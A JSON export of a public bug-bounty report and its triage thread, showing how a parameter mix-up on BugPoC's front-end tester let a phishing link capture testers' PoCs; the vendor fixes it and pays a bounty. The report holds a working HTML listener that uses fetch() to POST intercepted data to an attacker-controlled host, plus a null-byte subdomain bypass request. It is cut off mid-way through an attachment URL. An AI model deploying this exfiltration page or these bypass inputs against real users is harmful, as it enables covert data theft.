{"id":926221,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjYyMjE=","url":"https://hackerone.com/reports/926221","title":"Improper use of \"path\" parameter can be used to trick testers into leaking their Front-End PoC","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-07-17T15:51:01.996Z","submitted_at":"2020-07-17T15:51:01.996Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"acut3","url":"/acut3","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":49074,"url":"https://hackerone.com/bugpoc","handle":"bugpoc","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"BugPoC","twitter_handle":"bugpoc_official","website":"http://bugpoc.com","about":"A Platform to Build and Share Proof-of-Concepts for Bug Bounty Submissions, PenTest Deliverables, \u0026 Red Team Reports."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-07T19:12:08.538Z","bug_reporter_agreed_on_going_public_at":"2020-08-07T19:05:47.200Z","team_member_agreed_on_going_public_at":"2020-08-07T19:12:08.430Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nIn https://bugpoc.com/testers/front-end, the `populateFromFragment()` function  incorrectly assigns hash parameter `path` to the `subdomain` element, allowing the \"Test\" functionality of the Front-End PoC Generator to open a popup on any domain instead of the expected `web.bugpoc.ninja`.\n\nIt can be used to trick a BugPoC user (tester) into unknowingly sending his PoC to an attacker, using a malicious webpage that will intercept and exfiltrate the PoC that is sent as a message to the popup window when the \"Test\" button is used.\n\n## Steps To Reproduce:\nAs the attacker, I'm controlling the `acut3.xyz` domain. I proceeded as follows (the URLs are real and working):\n\n1. Host the following web page at http://acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html:\n\n    ```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n\u003cmeta charset=\"UTF-8\"\u003e\n\u003ctitle\u003e\u003c/title\u003e\n\u003cscript\u003e\nwindow.addEventListener(\"message\", e =\u003e {\n    fetch(\"http://acut3.xyz/tools-5gqh9fpa84fj/log.php\", {\n        method: \"POST\",\n        body: e.data,\n    });\n    ninja.contentWindow.postMessage(e.data, \"*\");\n});\n\u003c/script\u003e\n\u003c/head\u003e\n\u003cbody style=\"margin: 0\"\u003e\n\u003ciframe id=\"ninja\" src=\"http://www.web.bugpoc.ninja\" style=\"position: absolute;border: 0; width: 100%; height: 100%\"\u003e\u003c/iframe\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n    ```\n1. Have the victim open the https://bugpoc.com/testers/front-end#path=acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html# URL, enter his PoC there and hit the \"Test\" button.\n\nWhen it happens, the popup that normally opens http://www.web.bugpoc.ninja/index.html will actually opens the attacker-controlled http://acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html URL, because the `path` hash parameter has been used as the subdomain. This malicious page includes an iframe with the legitimate http://www.web.bugpoc.ninja URL, which allows the \"ready\" message to be sent to the opener with the expected origin. However, when the opener sends the PoC to the popup, it is intercepted by the malicious page and POSTed to the attacker's machine for logging. The message is also forwarded to the iframe so that everything looks normal from the victim's point of view (the popup will close as expected and the PoC Response will be displayed).\n\n## Impact\n\nUsing this vulnerability, a tester that is tricked into opening a https://bugpoc.com/testers/front-end URL with a malicious fragment will unknowingly send his Front-End PoC to the attacker when he hits the \"Test\" button.\n\nIt must be noted that the location where the PoC will run is correctly displayed above the PoC Code editor, which makes it possible to detect that something fishy is going on. This is easily overlooked however, especially if a short or ambiguous hostname is used by the attacker. Also, the fact that the fragment portion of the URL is removed automatically makes it *harder* to detect the attack. The address bar will look normal.\n\n## Remediation\nIn addition to fixing `populateFromFragment()`, I would advise adding an `X-Frame-Options` header to the `*.web.bugpoc.ninja` URLs. It could also be helpful to check the `source` of the event in `receiveFrontEndMessage()`, in addition to its `origin`.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eIn \u003ca title=\"https://bugpoc.com/testers/front-end\" href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Ftesters%2Ffront-end\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugpoc.com/testers/front-end\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, the \u003ccode\u003epopulateFromFragment()\u003c/code\u003e function  incorrectly assigns hash parameter \u003ccode\u003epath\u003c/code\u003e to the \u003ccode\u003esubdomain\u003c/code\u003e element, allowing the \u0026quot;Test\u0026quot; functionality of the Front-End PoC Generator to open a popup on any domain instead of the expected \u003ccode\u003eweb.bugpoc.ninja\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eIt can be used to trick a BugPoC user (tester) into unknowingly sending his PoC to an attacker, using a malicious webpage that will intercept and exfiltrate the PoC that is sent as a message to the popup window when the \u0026quot;Test\u0026quot; button is used.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eAs the attacker, I\u0026#39;m controlling the \u003ccode\u003eacut3.xyz\u003c/code\u003e domain. I proceeded as follows (the URLs are real and working):\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eHost the following web page at \u003ca title=\"http://acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html:\" href=\"/redirect?url=http%3A%2F%2Facut3.xyz%2Fbugpoc-u6e72i25g8zj%2Fpoc-listener.html%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html:\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;UTF-8\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddEventListener\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emessage\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"nx\"\u003efetch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttp://acut3.xyz/tools-5gqh9fpa84fj/log.php\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eninja\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econtentWindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e*\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin: 0\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;ninja\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.web.bugpoc.ninja\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;position: absolute;border: 0; width: 100%; height: 100%\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eHave the victim open the \u003ca title=\"https://bugpoc.com/testers/front-end#path=acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html%23\" href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Ftesters%2Ffront-end%23path%3Dacut3.xyz%2Fbugpoc-u6e72i25g8zj%2Fpoc-listener.html%2523\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugpoc.com/testers/front-end#path=acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html%23\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e URL, enter his PoC there and hit the \u0026quot;Test\u0026quot; button.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eWhen it happens, the popup that normally opens \u003ca title=\"http://www.web.bugpoc.ninja/index.html\" href=\"/redirect?url=http%3A%2F%2Fwww.web.bugpoc.ninja%2Findex.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.web.bugpoc.ninja/index.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e will actually opens the attacker-controlled \u003ca title=\"http://acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html\" href=\"/redirect?url=http%3A%2F%2Facut3.xyz%2Fbugpoc-u6e72i25g8zj%2Fpoc-listener.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e URL, because the \u003ccode\u003epath\u003c/code\u003e hash parameter has been used as the subdomain. This malicious page includes an iframe with the legitimate \u003ca title=\"http://www.web.bugpoc.ninja\" href=\"/redirect?url=http%3A%2F%2Fwww.web.bugpoc.ninja\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.web.bugpoc.ninja\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e URL, which allows the \u0026quot;ready\u0026quot; message to be sent to the opener with the expected origin. However, when the opener sends the PoC to the popup, it is intercepted by the malicious page and POSTed to the attacker\u0026#39;s machine for logging. The message is also forwarded to the iframe so that everything looks normal from the victim\u0026#39;s point of view (the popup will close as expected and the PoC Response will be displayed).\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eUsing this vulnerability, a tester that is tricked into opening a \u003ca title=\"https://bugpoc.com/testers/front-end\" href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Ftesters%2Ffront-end\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugpoc.com/testers/front-end\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e URL with a malicious fragment will unknowingly send his Front-End PoC to the attacker when he hits the \u0026quot;Test\u0026quot; button.\u003c/p\u003e\n\n\u003cp\u003eIt must be noted that the location where the PoC will run is correctly displayed above the PoC Code editor, which makes it possible to detect that something fishy is going on. This is easily overlooked however, especially if a short or ambiguous hostname is used by the attacker. Also, the fact that the fragment portion of the URL is removed automatically makes it \u003cem\u003eharder\u003c/em\u003e to detect the attack. The address bar will look normal.\u003c/p\u003e\n\n\u003ch2 id=\"remediation\"\u003eRemediation\u003c/h2\u003e\n\n\u003cp\u003eIn addition to fixing \u003ccode\u003epopulateFromFragment()\u003c/code\u003e, I would advise adding an \u003ccode\u003eX-Frame-Options\u003c/code\u003e header to the \u003ccode\u003e*.web.bugpoc.ninja\u003c/code\u003e URLs. It could also be helpful to check the \u003ccode\u003esource\u003c/code\u003e of the event in \u003ccode\u003ereceiveFrontEndMessage()\u003c/code\u003e, in addition to its \u003ccode\u003eorigin\u003c/code\u003e.\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-09-06T19:05:47.280Z","allow_singular_disclosure_after":-9806777.536785088,"singular_disclosure_allowed":true,"vote_count":70,"voters":["chamal","xdms","nytr0gen","sultancad","secator","s1r1u5","mashoud1122","hzllaga","melar_dev","pirateducky","and 60 more..."],"severity":{"rating":"medium","score":4.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":47876,"asset_type":"URL","asset_identifier":"*.bugpoc.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8631425,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey awesome bug! Let me make sure I understand the attack scenario correctly:\n\n1. The victim is tricked into opening https://bugpoc.com/testers/front-end#path=acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html%23\n1. The victim **then** enters his PoC information on this page\n1. The victim clicks test\n1. The attacker steals the PoC data\n\nDoes that all look correct to you?","markdown_message":"\u003cp\u003eHey awesome bug! Let me make sure I understand the attack scenario correctly:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe victim is tricked into opening \u003ca title=\"https://bugpoc.com/testers/front-end#path=acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html%23\" href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Ftesters%2Ffront-end%23path%3Dacut3.xyz%2Fbugpoc-u6e72i25g8zj%2Fpoc-listener.html%2523\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugpoc.com/testers/front-end#path=acut3.xyz/bugpoc-u6e72i25g8zj/poc-listener.html%23\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eThe victim \u003cstrong\u003ethen\u003c/strong\u003e enters his PoC information on this page\u003c/li\u003e\n\u003cli\u003eThe victim clicks test\u003c/li\u003e\n\u003cli\u003eThe attacker steals the PoC data\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eDoes that all look correct to you?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-17T16:01:32.930Z","updated_at":"2020-07-17T16:01:32.930Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8631500,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, that is correct.","markdown_message":"\u003cp\u003eYes, that is correct.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-17T16:02:49.902Z","updated_at":"2020-07-17T16:02:49.902Z","actor":{"username":"acut3","cleared":false,"url":"/acut3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8632038,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Looks legit. Nice find! The patch should reach prod in a few hours.","markdown_message":"\u003cp\u003eLooks legit. Nice find! The patch should reach prod in a few hours.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-17T16:10:20.739Z","updated_at":"2020-07-17T16:10:20.739Z","actor":{"url":"/bugpoc","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"BugPoC"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"bugpoc","collaborator":{"username":"acut3","url":"/acut3"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8633603,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Deployment successful. The `populateFromFragment()` function now correctly assigns hash parameter `path` to the `path` element. Your other proposed remediations are on the roadmap too.\n\nThanks for participating in our program and finding this cool bug!","markdown_message":"\u003cp\u003eDeployment successful. The \u003ccode\u003epopulateFromFragment()\u003c/code\u003e function now correctly assigns hash parameter \u003ccode\u003epath\u003c/code\u003e to the \u003ccode\u003epath\u003c/code\u003e element. Your other proposed remediations are on the roadmap too.\u003c/p\u003e\n\n\u003cp\u003eThanks for participating in our program and finding this cool bug!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-17T16:38:51.349Z","updated_at":"2020-07-17T16:38:51.349Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"acut3","url":"/acut3"},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8633612,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That was incredibly fast! Thanks for the bounty.","markdown_message":"\u003cp\u003eThat was incredibly fast! Thanks for the bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-17T16:40:33.022Z","updated_at":"2020-07-17T16:40:33.022Z","actor":{"username":"acut3","cleared":false,"url":"/acut3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8655119,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bugpoc_ryan, I just found a bypass by using the `subomain` hash parameter and ending it with `%00`. Since `/` isn't allowed you're limited to the the `/` URL on the malicious site, but this is easily bypassed with a VirtualHost if needed:\n\nhttps://bugpoc.com/testers/front-end#subdomain=bugpoc-u6e72i25g8zj.acut3.xyz%00\n\nNote that a PoC can also be *published* with a subdomain that ends with a null byte, which will cause the Organization to open a popup on the malicious site (something that wasn't possible with the original attack):\n```http\nPOST https://api.bugpoc.com/publish-poc HTTP/1.1\n[...]\n\n{\"bugTitle\":\"a\",\"bugDescription\":\"b\",\"pocDescription\":\"c\",\"pocData\":\"Test\",\"pocParameters\":[],\"pocType\":\"frontend\",\"pocConfig\":{\"subdomain\":\"acut3.xyz\\u0000\",\"path\":\"mypath\"}}\n```\nIt could theoretically be used to retrieve documents from the Organization's internal network when they execute the PoC, using DNS rebinding to bypass the same-origin policy. Although this is of course also possible without using BugPoC.","markdown_message":"\u003cp\u003e\u003ca href=\"/bugpoc_ryan\"\u003e@bugpoc_ryan\u003c/a\u003e, I just found a bypass by using the \u003ccode\u003esubomain\u003c/code\u003e hash parameter and ending it with \u003ccode\u003e%00\u003c/code\u003e. Since \u003ccode\u003e/\u003c/code\u003e isn\u0026#39;t allowed you\u0026#39;re limited to the the \u003ccode\u003e/\u003c/code\u003e URL on the malicious site, but this is easily bypassed with a VirtualHost if needed:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://bugpoc.com/testers/front-end#subdomain=bugpoc-u6e72i25g8zj.acut3.xyz%00\" href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Ftesters%2Ffront-end%23subdomain%3Dbugpoc-u6e72i25g8zj.acut3.xyz%2500\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugpoc.com/testers/front-end#subdomain=bugpoc-u6e72i25g8zj.acut3.xyz%00\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNote that a PoC can also be \u003cem\u003epublished\u003c/em\u003e with a subdomain that ends with a null byte, which will cause the Organization to open a popup on the malicious site (something that wasn\u0026#39;t possible with the original attack):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003ehttps://api.bugpoc.com/publish-poc\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"s\"\u003e[...]\u003c/span\u003e\n\n{\u0026quot;bugTitle\u0026quot;:\u0026quot;a\u0026quot;,\u0026quot;bugDescription\u0026quot;:\u0026quot;b\u0026quot;,\u0026quot;pocDescription\u0026quot;:\u0026quot;c\u0026quot;,\u0026quot;pocData\u0026quot;:\u0026quot;Test\u0026quot;,\u0026quot;pocParameters\u0026quot;:[],\u0026quot;pocType\u0026quot;:\u0026quot;frontend\u0026quot;,\u0026quot;pocConfig\u0026quot;:{\u0026quot;subdomain\u0026quot;:\u0026quot;acut3.xyz\\u0000\u0026quot;,\u0026quot;path\u0026quot;:\u0026quot;mypath\u0026quot;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt could theoretically be used to retrieve documents from the Organization\u0026#39;s internal network when they execute the PoC, using DNS rebinding to bypass the same-origin policy. Although this is of course also possible without using BugPoC.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T16:06:20.351Z","updated_at":"2020-07-20T16:06:20.351Z","actor":{"username":"acut3","cleared":false,"url":"/acut3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8655263,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the additional information. Were you able to actually open a popup to this domain? My browser is throwing an error. See screenshot. I tried using both Chrome and Safari.\n{F914279}\n","markdown_message":"\u003cp\u003eThanks for the additional information. Were you able to actually open a popup to this domain? My browser is throwing an error. See screenshot. I tried using both Chrome and Safari.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2020-07-20_at_12.22.50_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/U5zCsWSA445CaZjwtLVs1rKF?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-07-20_at_12.22.50_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-07-20_at_12.22.50_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071204Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfR